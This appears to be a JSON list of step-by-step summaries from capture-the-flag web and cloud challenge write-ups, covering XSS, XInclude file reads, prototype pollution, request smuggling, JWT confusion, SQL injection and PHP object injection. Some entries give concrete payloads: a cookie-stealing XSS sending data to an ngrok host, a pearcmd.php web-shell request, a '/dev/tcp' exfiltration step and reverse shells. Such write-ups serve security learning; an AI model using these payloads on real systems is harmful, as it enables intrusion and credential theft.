    "The payload utilized was designed to fetch cookies and encode them in base64, then send them to a pre-defined URL controlled by the attacker",
    "Identified that the input was being reflected into an XSL document",
    "Tested rendering in the browser and found an error was thrown",
    "Identified the Content-Type as 'text/xsl', indicating potential for Cross-Site Scripting",
    "Investigated methods for exploiting XSS attacks accessing XSL document",
    "Constructed a payload which utilises 'x:script' to exploit the vulnerability",
    "The payload utilized was designed to fetch cookies and encode them in base64, then send them to a pre-defined URL controlled by the attacker",
    "Analyze the Python code for the challenge that manages a market API.",
    "Understand that the customer eligibility to purchase exclusive items on the API depends on their fame and the sum of their point history.",
    "Identify a bug in the API where the index page is unauthenticated.",
    "Register as a new user on the API.",
    "Review the battle endpoint in which fame can hypothetically be increased, but as LOYALTY_SYSTEM_ACTIVE is set to False, it is impossible.",
    "Examine the buy endpoint to understand purchasing requests and conditions.",
    "Note that the code introduced a problem when attempting to add to an immutable namedtuple, which raises an AttributeError when performing the assignment.",
    "Realize that despite this raised exception, point history is successfully modified with each request to buy an item.",
    "Understand that while the namedtuple and tuple are immutable, if they contain mutable objects, those can still be modified in place.",
    "Learn that the += operator is not equivalent to an operation x = x + y in Python as it is in some other languages. This is because += performs the operation in place when possible and subsequently tries to assign the result back to the variable.",
    "Understand that the list was already successfully modified by the time an error was raised in the assignment step.",
    "To complete the challenge, send purchase requests to the API to increase loyalty point history a minimum of 1337 times.",
    "Unlock and buy the 'flagsword', completing the challenge.",
    "Identify that the code revolves around an XML parser",
    "Notice the use of 'ElementInclude.include(root)' in the code",
    "Understand that 'ElementInclude.include(root)' allows the use of XInclude directives",
    "Recognize that XInclude directives allow the parsing of files",
    "Identify that the server checks if 'text' is not included in 'xml.lower()'",
    "Understand that 'parse=\"xml\"' raises an error when used with non-XML content",
    "Devise a workaround by defining XML entities to form the string 'text'",
    "Use the workaround to parse the contents of '/etc/passwd' to the results",
    "Realize that the flag is in the environment variable",
    "Read '/proc/self/environ' to retrieve the flag",
    "Identify a prototype pollution vulnerability in '/api/tet/list' when merging request data.",
    "Observe that user input being passed to 'require()' leads to a Local File Inclusion (LFI) vulnerability.",
    "Propose to escalate this vulnerability to Remote Code Execution (RCE) given a valid .js file using an attribute that can be polluted to spawn a new process or execute a command.",
    "Consider that potential .js file candidates for execution are likely to be found in the node_modules folder which contains the source code of installed modules.",
    "Using 'grep' command to search for 'child_process' in all files of '/usr/local/lib/node_modules'.",
    "Find two scripts, 'changelog.js' and 'update-dist-tags.js' using 'child_process'.",
    "Analyze the 'changelog.js' script finding that it includes a 'execSync' call with a possible command injection.",
    "Notice that 'require()' call doesn't pass any arguments in 'changelog.js' so 'process.argv[2]' is undefined.",
    "Decide to pollute 'process.argv[2]' with a command injection payload before importing the 'changelog.js' file.",
    "Test this step locally with a python command that should create a reverse shell.",
    "Perform a prototype pollution on the web server by sending a POST request to the '/api/tet/list' endpoint with a JSON payload having '__proto__' polluted with a command injection payload in the 'data'.",
    "Exploit the LFI vulnerability to execute the 'changelog.js' script by sending a POST request to the '/api/tet/years' endpoint with a JSON payload in the request body specifying the 'changelog.js' script in the path.",
    "Expect to get a reverse shell as a result.",
    "Navigate to root directory and read the flag.",
    "Visited the provided webpage and accessed HTML source to find clues",
    "Identified an S3 bucket in the HTML source",
    "Used AWS CLI to access and download files from the 'palindromecloudynekos' S3 bucket",
    "Found a passcode and API endpoint details in the downloaded files",
    "Sent a request to the API endpoint with the appropriate 'X-Cat-Header' and obtained AWS credentials",
    "Enumerated permissions using tools like 'enumerate-iam' and 'pacu'",
    "Discovered interesting information in the 'iam list-roles' and 'iam list-instance-profiles' responses",
    "Identified privileged permissions to create and invoke AWS Lambda functions",
    "Created a Python script that opens a reverse shell and deployed it as a Lambda function",
    "Invoked the Lambda function to gain a reverse shell",
    "Using the new role, created an EC2 instance that triggers a reverse shell on startup",
    "Obtained new AWS credentials and used them to access DynamoDB",
    "Scanned the 'flag_db' DynamoDB table to retrieve the flag",
    "Inspect the source code and discover that all other endpoints are protected by authenticationMiddleware",
    "Understand that the mysqljs/mysql package is used without the option stringifyObjects: true",
    "Recognize that the express.json() allows Object and Array types to be given as req.body.email and req.body.password",
    "Use this behaviour when constructing SQL queries to bypass the login",
    "Authenticate successfully and gain access to the application",
    "Discover that the Express application is put behind a reverse proxy (Apache Traffic Server)",
    "Realize that the /do-report endpoint is mapped to /forbidden, preventing access unless not going through the proxy",
    "Research about the versions of Node.js and ATS used",
    "Find a HTTP request smuggling issue with incorrect parsing of chunk extensions",
    "Modify the available PoC to suit the given context",
    "Smuggle a request to the backend application, bypassing the access control implemented on ATS",
    "Understand that the verify.pug template has a unescaped username allowing HTML markup injection",
    "Learn about the Scroll-To-Text-Fragment (STTF) which is a Chromium feature allowing to scroll to a specific portion of the page using a text snippet in the URL",
    "Use the lazy-loaded image to detect if a scroll occurred when a text fragment is parsed in the URL",
    "Automate the submission of different text fragments and for each text fragment, detect if a callback is received",
    "Use this method to bruteforce the admin token one character at a time",
    "Automate the full exploit chain in solve.py",
    "Adjust necessary parameters in the python script",
    "Review challenge to identify goal: in this case, the purchase of a flag with starting balance of zero",
    "Identify weak point in code: where negative flag price is not validated in 'sellFlag' function",
    "Recognise potential exploit: apply negative price when selling a flag, which increases buyer's balance due to subtraction in 'buyFlag' function",
    "Initiate exploitation with HTTP POST request to sell flag with negative price",
    "Create a separate account to then buy the flag sold with negative price",
    "Perform Insecure Direct Object Reference (IDOR) to directly access the flag with 'flag_id=3' using HTTP POST /buy request",
    "Identified the need to perform an XSS attack, but noted that a Content Security Policy (CSP) was in place to prevent this.",
    "Noticed that the page used relative JavaScript paths, and that the scripts were always executed due to the `nonce` in the CSP.",
    "Changed the base URI of the page to attacker's own server using `<base href=//351b-42-60-216-15.ngrok.io>`.",
    "Noted that the relative paths would now load scripts from the attacker's server, which would usually not be possible due to the CSP.",
    "Hosted a file at `/static/page.js` on the attacker server and enabled CORS to execute arbitrary JavaScript through this file.",
    "Used the `nonce` to bypass the CSP again in order to exfiltrate data.",
    "Created a new script element, added the appropriate `nonce` from the rest of the script tags, and set the script source to the data wanted to exfiltrate.",
    "Appended the new script to the body of the document.",
    "Received the flag on the attacker server, indicating the successful execution of the attack.",
    "Establish a session with Shiba website through command session.get('https://shiba.yactf.ru/')",
    "Set a for loop to iterate a get request to 'https://shiba.yactf.ru/api/boop' through the established session 1500 times",
    "Print each response from the server through command r.text",
    "Get the final page after 1500 iterations through command session.get('https://shiba.yactf.ru/')",
    "Print the final page content and session cookies",
    "Discover the website uses JWT tokens to count the number of 'boops'",
    "Find the public key in '/signature/key.pub' as hinted in '/robots.txt'",
    "Understand how server processes the JWT. Take note that the public key, verifyKey, is used to validate JWT signature in both HS256 and RS256 cases",
    "Realize that the server signs new RS256 tokens with the private key, signKey, but we could generate our own HS256 token since we know the public key",
    "Sign a token with the public key verifyKey and set 1501 as the number of boops",
    "Collect the flag from the server's response",
    "Registered a new user and attempted to login which returns 'User not active' error",
    "Examined 'auth.py' and identified that a successful password reset would set 'user.active' to 'True', activating the user account",
    "Requested an OTP at '/request_code' to set 'user.code' to a random 4-digit number",
    "Noticed rate limiting being enforced on a per-email basis through a Redis store, which limits the number of OTP attempts to 3",
    "Identified that the OTP code was validated using SQL 'LIKE' operator and tried to insert '%' wildcard to bypass check",
    "Attempted to bypass `is_valid_email(email)` function but failed as the function doesn't allow special characters like '%'",
    "Understood that the `'re.match'` only matches at the _beginning_ of the string, allowing for wildcards at the _end_ of the email",
    "Created a script to brute force the OTP by appending '%' to the email and incrementally changing the OTP",
    "Gained access by passing the OTP check, ensuring the user script run by application was active",
    "Identified a post made by admin with the flag which is only visible to the admin",
    "Inspected Create Post code and identified the BeautifulSoup module being used to sanitize HTML and a restrictive CSP",
    "Exploited parser differential in BeautifulSoup and injected arbitrary HTML through HTML comments",
    "Analysed the server's CSP policy and identified a potential vulnerability with 'www.youtube.com' hosting a JSONP endpoint",
    "After unsuccessful attempts searching for YouTube's JSONP endpoints, found an issue on Google's issue tracker regarding YouTube's 'oembed' API not implementing JSONP",
    "Triggered a JSONP response from the YouTube API by providing a callback parameter",
    "Created a callback that reflected the response into Javascript code in order to inject arbitrary Javascript to exfiltrate contents from admin's page",
    "Submitted final payload that contained a script, exploiting YouTube's JSONP response and BeautifulSoup's parsing differential",
    "Identified the URL of the flag containing post '/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b' from the exfiltrated contents, and repeated the Javascript injection to fetch the flag",
    "Request the website's 'news' category at '?cat=news'",
    "Analyze the HTML response and find that 'news' string is reflected twice in the JavaScript",
    "Attempt to break out of the string with a single quote in '?cat=news'', but find the site prepends a backslash",
    "Discover the backslash character itself isn't escaped and attempt to break out using '?cat=news\\\\''",
    "Find any brackets or subsequent quotes are still escaped and can't produce valid JavaScript, conclude another route to XSS is needed",
    "Observe the site fetching resources at '/ajax/articles?cat=news' and inserting them into the 'ajax-load' element",
    "Try to inject an attribute into the 'img' element of the response by utilizing the 'cat' parameter in a request to '/ajax/articles?cat=asdf\"x=\"'",
    "Review the jQuery documentation and find a feature that allows specifying a remote document portion to insert",
    "Remove the 'noscript' tag and only load the 'img' element to circumvent restrictions",
    "Craft a '?cat=random\"onerror=\"alert`` img' request to render '<img src=\"/images/error.jpg\" alt=\"selected category random\"onerror=\"alert``\" />' and execute an XSS attack",
    "Create final payload '?cat=random\"onerror=\"window.location=`https://f5e6-49-245-33-142.ngrok.io?${document.cookie}` img' to steal the admin's cookie and get the challenge flag",
    "Inspect the search feature of the provided platform",
    "Look at the responses when searching for a note and examine the issued redirects",
    "Notice the difference in redirect URLs when a note is found or not found",
    "Consider the potential of exploiting the system by bloating the URL length (via the 'ids' parameter) to hit a limitation",
    "Explore the possibility of detecting a client-side error when exceeding Chrome's maximum URL length (2MB)",
    "Experiment with creating a URL that just hits the length limit and observe a redirection to an 'about:blank#blocked' page when the limit is exceeded",
    "Notice that if the URL limit is hit, the origin of the page remains that of the parent window",
    "Test the observation by creating a URL for a successful and unsuccessful query respectively and compare the resulting origins of the pages",
    "Derive a proof-of-concept (PoC) to brute-force a character of the flag by exploiting the observed behavior",
    "Leverage a backend server to eliminate unsuccessful queries and zero in on the correct flag",
    "Consider the downside of the above PoC - the potential strain on the server due to very long URLs",
    "Explore the alternative of exploiting Cross-Origin Resource Sharing (CORS) policy violation as a faster and more efficient method",
    "Create a policy that only allows form submissions to a specific domain, so queries leading to a different domain will be blocked",
    "Observe that the violation can be detected through a 'securitypolicyviolation' event listener",
    "Retrieve source files for AsmBB and FreshLib using wget, validate the files with SHA256 sums, and unpack the tar archives",
    "Build the asmbb engine source code using the Fresh IDE with Linux as the target OS",
    "Analyze the AsmBB source's render2.asm file, which contains a hash table of commands used by the templating engine",
    "Inspect the functionality of the 'minimag' and 'bbcode' commands, which are used for parsing content into HTML in the post_view.tpl file",
    "Test inputting content in MiniMag and BBCode format, which is accepted as 'format' in the post submission request data",
    "Familiarize with TranslateBBCode routine in bbcode.asm file part of FreshLib, which processes BBCode tags",
    "Explore the HTML encoding process of individual characters in the loop function",
    "Discover an edge case where not closing a BBCode tag results in an unencoded content being reflected, leading to an alert in the browser, indicating a Cross-Site Scripting (XSS) vulnerability",
    "Identify two other POST-based XSS vectors, though not exploitable for admin privileg access",
    "Determine that a setting called 'Pipe the emails through' uses the 'smtp_exec' variable, which is used in sending activation emails as an argument to Exec2 routine, indicating that Remote Code Execution (RCE) could be possible",
    "Upon granting admin privileges, modify the 'Pipe the emails through' command to send the flag to an external server using the '/readflag>/dev/tcp' command with the server's IP address and port number",
    "Put all components of the attack together in a combined exploit that first executes an XSS to grant admin privileged access and then initiates RCE to read and externally send the flag",
    "Identified prototype pollution vulnerability in `utils.merge()` method",
    "Exploited an off-by-one error in `background.js` font validation to manipulate `utils.FONTS[10]` and bypass standard checks",
    "Made a fetch request with polluted `credentials: include` option in `setFont.js` to use the credentials for `http://app/`",
    "The output was injected into the exploit page’s `style` element, which was readable by the attacker",
    "Identify that the first obstacle is HTTP request smuggling between ATS and Puma",
    "Recognize that ATS interprets \\\"chunked\\\" as chunked and Puma ignores invalid / unsupported Transfer-Encoding (TE) values",
    "Craft a request to smuggle a request to /admin in flagportal to perform an Server Side Request Forgery (SSRF)",
    "Host own server to capture the request, including the Admin-Key",
    "Decode the field First-Flag to extract the first flag",
    "Understand that the above request smuggling method won't allow capturing the second response from Puma",
    "Find out that the second obstacle is HTTP request smuggling between ATS and Waitress",
    "Understand that ATS processes LF as line endings (instead of CRLF), while Waitress allows LF in chunked extensions",
    "Craft a request with LF in chunk extension",
    "Note how ATS processes the LF as the end-of-line, leading to the second request be encapsulated in the chunked content of the first request",
    "Waitress sees both received requests",
    "Run 'python3 payload.py | nc localhost 8000' to capture the request",
    "From receiving server, decode the field flag to extract the second flag",
    "Understand that both Request smuggling vulnerabilities were discovered during previous research on ATS, Puma and Waitress by the challenge provider and other researchers",
    "Recognized that /api/flag-plz is mapped to /forbidden, and /api is mapped to /.",
    "Realized that http://flagportal.chall.seetf.sg:10001/api//flag-plz would be mapped to http://backend/flag-plz.",
    "Identified 2 HTTP request smuggling vulnerabilities.",
    "Used the discovered mapping to smuggle a request to /admin in flagportal to perform an SSRF.",
    "A request to /admin was constructed and resulted in catching the request including the Admin-Key on our own server.",
    "Obtained the first flag.",
    "Included a \\n character in a chunk extension in the second part of the challenge, to exploit a difference in how ATS and Waitress process end-of-line symbols.",
    "Crafted another request smuggling attack, that encapsulates the second request within the chunked contents of the first request.",
    "Used python3 payload.py | nc localhost 8000 to see the second flag on the receiving server.",
    "Enable logging through an API request to '/api/preferences' with the request body containing a 'logging' attribute set to true.",
    "Authenticate as a user by exploiting the fact that the MessageDigest object's digest() function is called twice when logging is enabled, effectively calculating the SHA-1 hash of an empty string. Using the known hash of an empty string as a token value results in successful authentication.",
    "Exploit log poisoning vulnerability in the application. Send a GET request to '/home' with the 'User-Agent' header value modified to include a Thymeleaf expression that fetches the value of the 'FLAG' environment variable (' + @environment.getProperty('FLAG') + '). This action modifies the logs and includes the value of 'FLAG' in the logs.",
    "Access the '/logs' endpoint with authentication to view the server logs which now include the value of 'FLAG' due to log poisoning.",
    "Identified LFI vulnerability to view '/etc/passwd'",
    "Discovered RCE vulnerability through pre-installed 'pearcmd.php'",
    "Wrote a PHP payload to '/tmp/pwn.php' using 'GET /?page=../../../../usr/local/lib/php/pearcmd.php&+config-create+/tmp/<?=system('/readflag')?>/*+/tmp/pwn.php HTTP/1.1'",
    "Used LFI to include '/tmp/pwn.php' using 'GET /?page=../../../../tmp/pwn.php HTTP/1.1'",
    "Understand that the challenge is based around exploiting dynamic renderers like Prerender, used to render sensitive endpoints via a custom host header",
    "Take note of the Nginx configuration that rewrites the URL using the host header",
    "Attempt to display the flag within the response body by using client-sided redirects",
    "Acknowledge that extra checks were implemented to necessitate XSS within the Chromium renderer and utilizing the 'localhost:3000' origin to avoid the Same Origin Policy",
    "Take notice of the 'validateUrls' mechanism which validates whether the URL begins with 'http://app', and can be bypassed by using the 'username:password@hostname' URL format",
    "Use 'Host: app@ATTACKER_URL' to bypass the validation",
    "Recognize the naive 'script remover' that removes script tags which can be bypassed by using 'onload' event handlers",
    "Acknowledge that any flags in the response body will be replaced by the Nginx frontend and this challenge cannot be simply solved via redirects to 'http://app/login.php'",
    "Understand that an XSS must be achieved within the 'localhost:3000' origin that allows for usage of the 'localhost:3000/render?url=' feature in order to avoid the same-origin policy and read the flag",
    "Host the 'outer.html' and 'inner.html' files",
    "Send a GET request to 'outer.html' with the custom host header targeting your own host",
    "Established the flaw in the validation mechanism - the URL is fetched twice, once to check for an SSRF attempt and again once it's deemed legitimate.",
    "Realized that the two-fetch mechanism could be exploited with two different responses.",
    "Initialized a server to exploit the above vulnerability.",
    "Configured the server to give two different responses, the first passes the SSRF check.",
    "Programmed the server for the second response to redirect to 'http://localhost/flag' to obtain the flag.",
    "Noticed that 'mootools' JavaScript library is used and is vulnerable to client-side prototype pollution",
    "Identified that if the request token is wrong, then the 'request.accessGranted' attribute would not be set and is thus undefined",
    "Executed Prototype pollution to manipulate the 'accessGranted' attribute to bypass Access Denied error",
    "Noticed that a 'note' is 'found' as long as 'note.startsWith(request.search)'",
    "Using the navigation factor, performed an XS leak attack to verify if a substring exists in the flag",
    "Conducted an extraction of the flag character by character leveraging the navigation function and the XS leak",
    "Identified the suspicious logic of the JavaScript which does not declare the 'name' variable if 'length' query parameter exists but is a string of length 0",
    "Observed that global scope is the window object in HTML and 'name' variable refers to 'window.name' which can be controlled when new window is opened",
    "Decided to control the 'window.name' variable to exploit the vulnerability",
    "Recreated the scenario where 'name' variable is never redeclared by using '?length=' as the query string which ensures 'usernameLength' is empty",
    "Created an exploit script using 'window.open()' on the exploit server to control 'window.name'",
    "Used an XSS payload using 'innerHTML' to fetch the flag",
    "Successfully fetched the flag using the XSS payload",
    "There is a Use After Free (UAF) when deleting a node, with the HEAD never updating if the first index is removed.",
    "We can control `HEAD->name` by overwriting it in the next `malloc()` call in `insertSorted()`.",
    "In WASM, ASLR doesn't exist. We can therefore predict the address where our XSS payload will be inserted - this information can be obtained by debugging with Chrome DevTools.",
    "The `name` is written to memory, regardless of whether it passes the XSS check in `validateJared()`. We can exploit this by first 'inserting' our XSS payload then overwriting the `HEAD->name` to the address the XSS payload. `getNameAtIndex(0)` will then return the XSS payload when displaying the table.",
    "We can set a breakpoint after the `malloc` call and before the `strcpy` call. `$var8` is set immediately after `call $dlmalloc` - this would be the pointer to the newly allocated memory where the payload will be stored.",
    "The index is randomized, giving us a 10% chance of success. We could simply execute this multiple times until the index is 0.",
    "Loaded the page at `/` which simply says `Hello Mars!`.",
    "Found the app at `http://whatever.domain.com/app/`.",
    "Used `dirb/wordlists/common.txt` wordlist to find the endpoint.",
    "Discovered that the application is a PHP proxy that allows users to visit websites from it.",
    "Found out from the footer that the application is 'Powered by PHP-Proxy'.",
    "Identified PHP-Proxy (all versions) have a Local File Inclusion (LFI) vulnerability.",
    "Identified the encryption key is generated using `Config::set('encryption_key', md5(Config::get('app_key').$_SERVER['REMOTE_ADDR']));`.",
    "Found that the URL is encrypted using `str_rot_pass($url, $key);`.",
    "Discovered encryption function is not secure enough and can be decrypted.",
    "Reverse-engineered the key using the ciphertext and original plaintext.",
    "Upon getting the key, encrypted `file:///var/www/html/flag.txt`.",
    "The `file://` protocol was not explicitly banned, making the encryption possible.",
    "Used `python3 solve.py` to exploit the LFI vulnerability.",
    "Retrieved the flag `STC{l0cal_f1l3_1nclus10n_328d47c2ac5b2389ddc47e5500d30e04}`.",
    "Examined the index.php and found a comment detailing an admin console at http://172.16.2.155.",
    "Attempting to navigate to login.php resulted in a 403 Forbidden error.",
    "Conducted a scan for the 172.16.2.0/24 subnet using the X-Forwarded-For header with a tool like Burp Suite Intruder.",
    "Upon setting X-Forwarded-For to 172.16.2.24, access to the login page was achieved.",
    "Performed a curl command at localhost:55043/login.php with the X-Forwarded-For header set to 172.16.2.24.",
    "Using SQL injection via a POST request to the /login.php with altered email and pass fields: 'test' UNION SELECT 'test', 'test'#.",
    "Extracted the challenge flag from the server response after successful SQL injection.",
    "Analyzed the provided PHP source code for the application's authentication process",
    "Identified that the 'login' cookie is deserialized into a Login object",
    "Understood the structure of the 'Login' object which consists of a 'User' object and an MFA token",
    "Identified the presence of SQL object within User Class which executes SQL queries for user authentication",
    "Identified the opportunity for a PHP Object Injections vulnerability due to the deserialization process",
    "Formulated a Property-Oriented Programming (POP) chain for exploiting the identified vulnerability",
    "Created a custom 'Login' object where '$mfa_token' is a reference to the '$_correctValue' attribute to bypass the MFA token check",
    "Identified that the 'SQL' class has a '$query' attribute which can be modified to perform an SQL injection",
    "Created an SQL query that returns a 'valid' result set with 'email' and 'password' columns to bypass the authentication check",
    "Used the PHP serialize() function to serialize the custom 'Login' object",
    "Created a base64 encoded serialized data to inject into the 'login' cookie",
    "Injected the exploit into the 'login' cookie to bypass the login process and get access to the system"
]